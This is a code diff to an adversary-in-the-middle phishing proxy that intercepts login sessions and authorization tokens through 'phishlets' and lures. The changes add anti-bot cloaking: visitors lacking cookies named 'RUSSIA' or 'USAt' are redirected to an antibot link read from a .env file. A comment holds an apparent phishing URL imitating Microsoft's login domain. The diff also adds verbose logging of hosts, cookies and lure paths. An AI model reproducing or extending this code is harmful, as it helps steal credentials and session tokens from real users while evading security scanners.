@@ -15,6 +15,7 @@ import (
 	"crypto/tls"
 	"encoding/base64"
 	"fmt"
+	"github.com/joho/godotenv"
 	"html"
 	"io/ioutil"
 	"net"
@@ -66,6 +67,8 @@ type HttpProxy struct {
 	sessions          map[string]*Session
 	sids              map[string]int
 	cookieName        string
+	cookiebot         string
+	cookielandingv1   string
 	last_sid          int
 	developer         bool
 	ip_whitelist      map[string]int64
@@ -79,6 +82,18 @@ type ProxySession struct {
 	Created     bool
 	PhishDomain string
 	Index       int
+}
+
+func goDotEnvVariable(key string) string {
+
+	// load .env file
+	err := godotenv.Load(".env")
+
+	if err != nil {
+		log.Error("Error loading .env file")
+	}
+
+	return os.Getenv(key)
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
@@ -115,6 +130,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	}
 
 	p.cookieName = GenRandomString(4)
+	//p.cookiebot = "FWrD"
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
@@ -129,7 +145,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
 
 	p.Proxy.OnRequest().
-		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+		DoFunc(func(
+			req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+
 			ps := &ProxySession{
 				SessionId:   "",
 				Created:     false,
@@ -138,6 +156,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
+
+			log.Warning("REQ QUERY TOP: %s", req.URL)
+
+			msg, err := req.Cookie("RUSSIA")
+
+			if err != nil {
+				log.Error("msg: %v", err)
+				return p.antiddos(req, ps, goDotEnvVariable("LINK_URL"), "USA")
+
+			} else {
+				if !p.isForwarderUrlBy2(req) {
+					return p.antiddos(req, ps, goDotEnvVariable("LINK_URL"), "USAt")
+				}
+				log.Important(msg.Value)
+			}
 
 			// handle ip blacklist
 			from_ip := req.RemoteAddr
@@ -160,12 +193,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
+			log.Warning("REQ_URL: %s", req_url)
+			log.Warning("REQ URL PATH: %s", req.URL.Path)
 			lure_url := req_url
 			req_path := req.URL.Path
+			log.Warning("REQ_PATH: %s", req_path)
+			log.Warning("REQ_HOST: %s", req.Host)
 			if req.URL.RawQuery != "" {
 				req_url += "?" + req.URL.RawQuery
 				//req_path += "?" + req.URL.RawQuery
 			}
+			log.Warning("REQ_URL_QUERY: %s", req_url)
 
 			//log.Debug("http: %s", req_url)
 
@@ -173,8 +211,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			remote_addr := parts[0]
 
 			phishDomain, phished := p.getPhishDomain(req.Host)
+			log.Warning("PHISHED: %v", phished)
+			log.Warning("PHISH_DOMAIN: %s", phishDomain)
 			if phished {
 				pl := p.getPhishletByPhishHost(req.Host)
+				log.Warning("PL_NAME: %s", pl.Name)
 				pl_name := ""
 				if pl != nil {
 					pl_name = pl.Name
@@ -182,15 +223,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				egg2 := req.Host
 				ps.PhishDomain = phishDomain
+				log.Warning("DOMAIN PHISING : %s", ps.PhishDomain)
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
 					sc, err := req.Cookie(p.cookieName)
+					//_, err = req.Cookie(p.cookiebot)
+					//testss := GenRandomString(4)
+					//_, err2 := req.Cookie(testss)
+					//if err2 != nil {
+					//	log.Error("Error COOKies %s", err2)
+					//}
+					log.Warning("COOKIE NAME : %s", p.cookieName)
+					//log.Warning("COOKIE : %s", sc.Value)
+					//log.Warning(req.)
 					if err != nil && !p.isWhitelistedIP(remote_addr) {
 						if !p.cfg.IsSiteHidden(pl_name) {
 							var vv string
 							var uv url.Values
 							l, err := p.cfg.GetLureByPath(pl_name, req_path)
+							log.Warning("PL NAME : %s", pl_name)
 							if err == nil {
 								log.Debug("triggered lure for path '%s'", req_path)
 							} else {
@@ -310,6 +362,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						l, err := p.cfg.GetLureByPath(pl_name, req_path)
+						//l.Path = "/kontolbabi"
+						log.Warning("test", l)
 						if err == nil {
 							// show html template if it is set for the current lure
 							if l.Template != "" {
@@ -327,13 +381,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 											body := string(html)
 											body = p.replaceHtmlParams(body, lure_url, &s.Params)
+											//log.Warning(body)
+											// START LANDING LURES
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+											resp.Header.Set("Content-komtol", strconv.Itoa(len(body)))
+											resp.Request.AddCookie(&http.Cookie{Name: "BENER", Value: "SALAH"})
+											resp.Cookies()
+											log.Warning("cookies benar %s", resp.Cookies())
 											if resp != nil {
 												return req, resp
 											} else {
 												log.Error("lure: failed to create html template response")
 											}
+
+											// END LANDING LURES
 										} else {
 											log.Error("lure: failed to read template file: %s", err)
 										}
@@ -354,9 +416,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if err == nil {
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
-						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "no idea")
 						if resp != nil {
 							resp.Header.Add("Location", rurl)
+							log.Important("Redirect From Lure Path: %s to %s", req_path, rurl)
 							return req, resp
 						}
 					}
@@ -589,11 +652,40 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return nil
 			}
 
-			// handle session
-			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
+
+			//ds := &http.Cookie{}
+			//ds = &http.Cookie{
+			//	Name:    "FWrD",
+			//	Value:   "true",
+			//	Path:    "/",
+			//	Domain:  ps.PhishDomain,
+			//	Expires: time.Now().UTC().Add(60 * time.Minute),
+			//	MaxAge:  60 * 60,
+			//}
+			//
+			//resp.Request.AddCookie(ds)
+
+			// handle session
+			//cookiesss := resp.Cookies()
+			//log.Warning("COOKIES RESPONSE ATAS", cookiesss)
+
+			ck := &http.Cookie{}
+			ls := &http.Cookie{}
+			ds := &http.Cookie{}
+
 			if ps.SessionId != "" {
 				if ps.Created {
+
+					ds = &http.Cookie{
+						Name:    p.cookielandingv1,
+						Value:   "true",
+						Path:    "/",
+						Domain:  ps.PhishDomain,
+						Expires: time.Now().UTC().Add(60 * time.Minute),
+						MaxAge:  60 * 60,
+					}
+
 					ck = &http.Cookie{
 						Name:    p.cookieName,
 						Value:   ps.SessionId,
@@ -602,9 +694,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						Expires: time.Now().UTC().Add(60 * time.Minute),
 						MaxAge:  60 * 60,
 					}
+
+					if p.cookiebot == "USA" {
+						ls = &http.Cookie{
+							Name:    p.cookiebot,
+							Value:   "false",
+							Path:    "/",
+							Domain:  ps.PhishDomain,
+							Expires: time.Now().UTC().Add(60 * time.Minute),
+							MaxAge:  60 * 60,
+						}
+					} else {
+						ls = &http.Cookie{
+							Name:    p.cookiebot,
+							Value:   "true",
+							Path:    "/",
+							Domain:  ps.PhishDomain,
+							Expires: time.Now().UTC().Add(60 * time.Minute),
+							MaxAge:  60 * 60,
+						}
+					}
+
 				}
 			}
 
+			log.Warning("ls: %s", ls)
+			//ls.
+			//ls.Valid()
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
 				if u, err := url.Parse(allow_origin); err == nil {
@@ -655,6 +771,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			is_auth := false
 			cookies := resp.Cookies()
 			resp.Header.Del("Set-Cookie")
+
+			// LS
+
+			// END LS
+
 			for _, ck := range cookies {
 				// parse cookie
 
@@ -705,6 +826,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if ck.String() != "" {
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
+
+			if ls.String() != "" {
+				resp.Header.Add("Set-Cookie", ls.String())
+			}
+
+			if ds.String() != "" {
+				resp.Header.Add("Set-Cookie", ds.String())
+			}
+			res, _ := resp.Request.Cookie(ds.Name)
+			//json.Unmarshal([]byte(res), &res)
+			log.Warning("COOKIES RESPONSE BAWAH", res)
 			if is_auth {
 				// we have all auth tokens
 				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
@@ -891,8 +1023,53 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	return req, nil
 }
 
+func (p *HttpProxy) antiddos(req *http.Request, ps *ProxySession, url string, cookieUSA string) (*http.Request, *http.Response) {
+
+	p.cookielandingv1 = "RUSSIA"
+	p.cookiebot = cookieUSA
+
+	ls := &http.Cookie{
+		Name:    p.cookielandingv1,
+		Value:   "true",
+		Path:    "/",
+		Domain:  ps.PhishDomain,
+		Expires: time.Now().UTC().Add(60 * time.Minute),
+		MaxAge:  60 * 60,
+	}
+
+	st := &http.Cookie{
+		Name:    p.cookiebot,
+		Value:   "true",
+		Path:    "/",
+		Domain:  ps.PhishDomain,
+		Expires: time.Now().UTC().Add(60 * time.Minute),
+		MaxAge:  60 * 60,
+	}
+
+	//if len(p.cfg.redirectUrl) > 0 {
+
+	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+
+	if ls.String() != "" {
+		resp.Header.Add("Set-Cookie", ls.String())
+	}
+
+	if st.String() != "" {
+		resp.Header.Add("Set-Cookie", st.String())
+	}
+
+	log.Warning("REQ.URl: %s", url)
+	if resp != nil {
+		resp.Header.Add("Location", goDotEnvVariable("LINK_ANTIBOT")+base64.StdEncoding.EncodeToString([]byte(url)))
+		return req, resp
+	}
+
+	return req, nil
+}
+
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 	vals := u.Query()
+	log.Warning("forawrded url: %s", vals)
 	for _, v := range vals {
 		dec, err := base64.RawURLEncoding.DecodeString(v[0])
 		if err == nil && len(dec) == 5 {
@@ -906,6 +1083,103 @@ func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 		}
 	}
 	return false
+}
+
+//https://microsoftonline.verify-status.online/login/aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tL1NpWG5jbEFUP3ZlcmlmeT14eFdD
+
+func (p *HttpProxy) isForwarderUrlBy2(req *http.Request) bool {
+
+	_, err := req.Cookie("USAt")
+	if err != nil {
+		//p.cookiebot = "USAt"
+		//p.cookielandingv1 = "RUSSIA"
+		log.Error("ERROR USAt %s", err)
+		return false
+
+	} else {
+		p.cookiebot = "USAt"
+		p.cookielandingv1 = "RUSSIA"
+		return true
+	}
+
+	//log.Warning("")
+
+	//p.cookiebot = "BABI"
+	//_, err := req.Cookie(p.cookiebot)
+	//if err != nil {
+	//	log.Error(err.Error())
+	//	return false
+	//}
+	//_, err = req.Cookie(p.cookielandingv1)
+	//if err != nil {
+	//	return false
+	//}
+
+	//
+	//_, err = req.Cookie(p.cookiebot)
+	//if err != nil {
+	//	return false
+	//}
+
+	//if strings.Contains(requrl, "https://login.microsoftonline.com/common/") {
+	//	return true
+	//}
+	//
+	//if strings.Contains(requrl, "https://login.microsoftonline.com/common/reprocess") {
+	//	return true
+	//}
+	//
+	//if requrl == "https://www.office.com/landingv2" {
+	//	return true
+	//}
+	//
+	//if requrl == "https://www.office.com/login" {
+	//	return true
+	//}
+	//
+	//if requrl == "https://login.microsoftonline.com/kmsi" {
+	//	return true
+	//}
+	//
+	//if requrl == "https://login.microsoftonline.com/common/login" {
+	//	return true
+	//}
+	//
+	//if requrl == "https://login.microsoftonline.com/" {
+	//	return true
+	//}
+	//
+	//if strings.Contains(requrl, "https://www.office.com/login") {
+	//	return true
+	//}
+	//
+	//log.Warning("URL NOW ACCESS: %s", u.String())
+	//vals := u.Query()
+	//log.Warning("forawrded url: %s", vals)
+	//data := vals.Get("verify")
+	//if data == cookiesname {
+	//	log.Important("VERIFY TRUE")
+	//	return true
+	//} else {
+	//	log.Warning("VERIFY FALSE")
+	//	for _, v := range vals {
+	//		dec, err := base64.RawURLEncoding.DecodeString(v[0])
+	//		log.Warning("dec: %s", dec)
+	//		if err == nil && len(dec) == 5 {
+	//			var crc byte = 0
+	//			for _, b := range dec[1:] {
+	//				crc += b
+	//			}
+	//			if crc == dec[0] {
+	//				log.Warning("TRUE FOR")
+	//				return true
+	//			}
+	//		}
+	//	}
+	//	log.Warning("VERIFY RETURN FALSE")
+	//	return false
+	//}
+
 }
 
 func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
@@ -1260,6 +1534,7 @@ func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
 }
 
 func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
+	log.Warning("replaceHostWithOriginal: %s", hostname)
 	if hostname == "" {
 		return hostname, false
 	}
@@ -1268,6 +1543,7 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 		prefix = "."
 		hostname = hostname[1:]
 	}
+	log.Warning("replaceHostWithOriginal AFTER IF: %s", hostname)
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
